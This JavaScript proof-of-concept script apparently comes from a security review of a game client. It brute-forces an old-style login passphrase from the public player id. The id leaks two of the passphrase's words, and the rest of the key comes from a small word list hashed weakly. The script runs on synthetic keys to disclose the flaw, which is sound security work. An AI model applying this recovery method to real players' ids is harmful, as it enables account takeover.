/* Synthetic proof: an OLD-style Login Key is recoverable from its public player id.
   Uses the client's own generatePassphrase/passphraseToId logic copied verbatim
   from src/networking/index.js:34-38,95-101 (no real player data). */
const BT_WORDS = ['alpha','blaze','coral','drift','ember','frost','grove','haven','ivory','jade','karma','lunar','mango','nexus','onyx','pixel','quartz','raven','solar','thunder','ultra','viper','wrath','xenon','yeti','zenith','amber','bolt','cipher','dusk','echo','flare','ghost','haze','iron','jet','knack','lava','mystic','nova','orbit','prism','quest','ridge','storm','titan','umbra','vault','wisp','zeal'];
function generatePassphrase() { const w = []; for (let i = 0; i < 4; i++) w.push(BT_WORDS[Math.floor(Math.random() * BT_WORDS.length)]); return w.join('-') + '-' + Math.floor(Math.random() * 99); }
function passphraseToId(phrase) { let hash = 0; for (let i = 0; i < phrase.length; i++) hash = ((hash << 5) - hash + phrase.charCodeAt(i)) | 0; return 'bp_' + Math.abs(hash).toString(36) + '_' + phrase.split('-').slice(0, 2).join(''); }
let ok = 0, tries = 0, totalMs = 0;
for (let t = 0; t < 20; t++) {
  const secret = generatePassphrase();
  const pub = passphraseToId(secret);
  const t0 = Date.now();
  // attacker: only `pub`. The suffix is word1+word2 concatenated; split it against the list.
  const suffix = pub.split('_').slice(2).join('_');
  const found = [];
  for (const a of BT_WORDS) for (const b of BT_WORDS) if (a + b === suffix) {
    for (const c of BT_WORDS) for (const d of BT_WORDS) for (let n = 0; n < 99; n++) {
      const cand = a + '-' + b + '-' + c + '-' + d + '-' + n;
      tries++;
      if (passphraseToId(cand) === pub) found.push(cand);
    }
  }
  totalMs += Date.now() - t0;
  if (found.length === 1 && found[0] === secret) ok++;
}
console.log(`recovered the exact old key from the public id in ${ok}/20 trials; avg ${Math.round(totalMs/20)} ms each; ${Math.round(tries/20)} candidates per id`);
